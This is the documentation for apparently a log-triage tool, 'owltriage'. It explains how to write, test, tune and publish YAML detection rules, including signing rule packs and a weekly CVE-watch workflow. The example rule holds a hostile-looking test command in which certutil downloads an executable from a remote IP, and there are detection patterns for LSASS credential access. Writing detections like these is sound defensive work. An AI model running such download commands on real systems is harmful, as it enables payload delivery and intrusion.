# Writing detection rules

Every detection in owltriage is a YAML rule in [`owltriage/rules/`](../owltriage/rules/).
You can add rules **without writing Python**, and every rule carries its own tests.

```bash
owltriage rules list                 # what is loaded (add --type event, web, ...)
owltriage rules test                 # run every rule's examples
owltriage rules test my-new-rule     # just yours
owltriage hunt logs/ --rules-dir ./my-rules     # use your own rules directory
```

## Anatomy of a rule

```yaml
- id: cmd-certutil-download          # unique, lowercase-kebab-case
  name: SUSPICIOUS_COMMAND           # category: groups findings, shown in reports and block reasons
  title: certutil used to download a file (LOLBin)
  type: command                      # web | command | line | event | correlation
  severity: high                     # info | low | medium | high | critical
  mitre: [T1105]                     # ATT&CK IDs; must exist in resources/attack.yml
  block: inbound                     # optional: generate a firewall rule for the finding's IP
  pattern: '\bcertutil(?:\.exe)?\b.{0,100}-urlcache\b.{0,200}(?:https?|ftp)://'
  description: Optional longer explanation.
  references: ["https://lolbas-project.github.io/lolbas/Binaries/Certutil/"]
  false_positives: ["Admins fetching CRLs by hand"]
  author: your-github-handle
  tests:
    match:    ["certutil.exe -urlcache -split -f http://203.0.113.99/p.exe p.exe"]
    no_match: ["certutil -hashfile file.exe SHA256"]
```

Regexes are case-insensitive by default (`ignore_case: false` to change that) and use
Python's [`re` syntax](https://docs.python.org/3/library/re.html). In YAML, put them in
single quotes so backslashes stay literal; write a literal `'` as `''`.

## Rule types

| type | Matched against | Finding IP |
|---|---|---|
| `web` | URL-decoded request path (a `+`→space variant is also tried); add `fields: [path, user_agent, referrer]` to choose | HTTP client |
| `command` | sudo `COMMAND=`, Windows 4688 / Sysmon 1 `CommandLine`, PowerShell 4104 `ScriptBlockText`, and any base64 / `-EncodedCommand` payload **after decoding** | client IP if known |
| `line` | the raw line of text logs (auth.log, syslog, …) | IP parsed from the line |
| `event` | structured Windows events (see below) | `ip_field` if set |
| `correlation` | built-in stateful logic; YAML tunes it | the attacker |

### Event rules

```yaml
- id: win-privileged-group-add
  name: PRIVILEGE_ESCALATION
  title: Account added to privileged group
  type: event
  severity: high
  mitre: [T1098]
  match:
    event_id: [4728, 4732, 4756]          # one number or a list
    provider: Microsoft-Windows-Security-Auditing   # optional, substring match
    channel: Security                      # optional, exact match
    fields:                                # optional; EVERY regex must match
      TargetUserName: '^(?:administrators|domain admins)$'
      # '*': 'regex'                       # special: matches if ANY field matches (unnamed <Data> events)
  detail: "{MemberSid} added to {TargetUserName} by {SubjectUserName}"   # {Field} placeholders; {A|B} = first one present
  tests:
    match:    [{event_id: 4732, TargetUserName: Administrators, MemberSid: S-1-5-21-1-1001}]
    no_match: [{event_id: 4732, TargetUserName: Remote Desktop Users}]
```

Field names are exactly the `<Data Name="...">` names of the event (or the `event_data`
keys in Winlogbeat JSON). Test samples are mappings with `event_id`, optional `provider` /
`channel`, and the fields. Windows writes `-` for empty fields; templates drop those. When the same
value sits in different fields depending on the event (`ProcessName` in 4673, `Image` in Sysmon 1),
write `{ProcessName|Image}`: the first field that has a value is used.

### Correlation rules

The seven built-ins live in [`correlation.yml`](../owltriage/rules/correlation.yml). Their
logic is in `detectors.py`; their numbers are yours to tune:

| id | tunable keys |
|---|---|
| `auth-brute-force` | `threshold`, `window_seconds`, `spraying_min_users`, `mitre_spraying` |
| `auth-success-after-brute-force` | uses the brute-force threshold and window |
| `encoded-payload` | `severity_command`, `title_command`, `mitre_command` |
| `win-explicit-credential-spray` | `min_accounts`, `window_seconds` (event 4648: different accounts tried from one source) |
| all | `severity`, `mitre`, `block`, `enabled` |

## Overriding packaged rules

Files in `--rules-dir` are merged on top of the packaged rules. If an `id` already exists,
**only the keys you set change**:

```yaml
# my-rules/tuning.yml
- id: auth-brute-force
  threshold: 10
  window_seconds: 300
- id: win-kerberoasting
  enabled: false          # we still run legacy RC4 services
- id: win-sysmon-lsass-access
  match:                  # replace the match block to allowlist your EDR
    event_id: 10
    provider: Microsoft-Windows-Sysmon
    fields:
      TargetImage: '\\lsass\.exe$'
      GrantedAccess: '^0x(?:1010|1410|1438|143a|1fffff)$'
      SourceImage: '^(?!.*\\YourEDR\\agent\.exe$).+'
```

## Quality checklist (CI enforces the first four)

1. At least one `match` **and** one `no_match` example. The `no_match` should be a realistic
   benign look-alike (`/blog/union-station-review` for a `UNION SELECT` rule).
2. Every ATT&CK ID exists in `resources/attack.yml` (add new ones with their official name).
3. The regex compiles and the rule passes `owltriage rules test`.
4. No unknown keys (a typo like `patern:` is an error, not silently ignored).
5. **Bounded quantifiers.** Rules only ever see the first 8 KB of input, but write
   `.{0,200}` instead of `.*` between keywords and avoid nested quantifiers like `(a+)+`,
   so a hostile 8 KB command line stays fast.
6. Prefer behavior that is hard to rename away (the PortProxy registry key) over names an
   attacker controls (a renamed `psexec.exe`).
7. Note known false positives in `false_positives:`.

## Rule versions

Any change to a rule file needs a new version in `owltriage/rules/VERSION`: today's date as `YYYY.MM.DD`
(add `.2`, `.3` for more changes the same day). Rules packs are compared by this version, so a change
without a new version would never reach users. `pytest tests/test_rules_version.py` fails until you bump
it, and prints the new `digest` line to paste in.

## Publishing rules packs (maintainers)

On every push to `main` that changes a rule, the **Rules pack** workflow runs the rule tests, signs the
rules with the `RULES_SIGNING_KEY` secret and publishes `owltriage-rules.json` on the `rules-pack` branch.
Users get it with `owltriage update-rules`, without a new owltriage release. Without the secret the
workflow runs its checks and publishes nothing.

One-time setup:

1. Make a key with `python tools/rulepack.py keygen` (or `openssl rand -base64 32`). The value is
   the secret: it goes into GitHub and nowhere else.
2. In the repository on GitHub, open Settings, then Environments, and create `rules-pack`. Add the
   environment secret `RULES_SIGNING_KEY`. Optionally add yourself under Required reviewers, so every
   pack waits for your approval before it is signed.
3. Run the workflow once (Actions, Rules pack, Run workflow). Its log shows the public key, and it fails
   until that key is listed in `TRUSTED_KEYS` in `owltriage/rulepack.py`. Add it there and push.
4. Packs are accepted by owltriage versions that contain the key, so ship it in the next release.

## The weekly rule watch

Every Monday the **Rule watch** workflow (`tools/rule_watch.py`) looks at what changed outside the repo:

- **CISA's Known Exploited Vulnerabilities.** Entries added in the last 30 days and not reported before go
  into one issue, labelled `rule-watch`, with known ransomware use and whether a public nuclei template
  exists. Rows without a rule need a person: would the attack show in the logs OwlTriage reads?
- **Candidate web rules.** For a new KEV CVE whose nuclei template requests a distinctive path (not `/`,
  `/login` or `/v1/users/me`), the watch writes a rule into `owltriage/rules/web-kev.yml`: `medium`
  severity, `high` if ransomware is known to use the CVE. A candidate is dropped if it fails its own
  examples or matches anything in a benign access log (Elastic's public Apache sample).
- **MITRE ATT&CK.** Technique names MITRE changed are fixed in `owltriage/resources/attack.yml`. Revoked
  or deprecated techniques are reported in the issue with the replacement and the rules that use them,
  because moving a rule to another technique is a decision.

Rules and name fixes arrive as a pull request, after the whole test suite passed on them, with
`owltriage/rules/VERSION` already bumped. Review each path: a rule is only useful if normal use of the
product does not call it. Merging publishes the next signed rules pack. Nothing is merged automatically.

For the workflow to open the pull request itself, allow it once in Settings, Actions, General, Workflow
permissions ("Allow GitHub Actions to create and approve pull requests"). Without that, the changes wait on
a `rule-watch/...` branch and the issue links to a one-click "open a pull request" page. Run it any time
from Actions, Rule watch, Run workflow; locally, `python tools/rule_watch.py --help` lists the inputs.

To rotate the key, add the new public key to `TRUSTED_KEYS` next to the old one, release, then replace
the secret; drop the old key a release later. If the secret leaks, remove its key from `TRUSTED_KEYS`,
release, and make a new key. Installs that have not upgraded still trust the old key until they do.

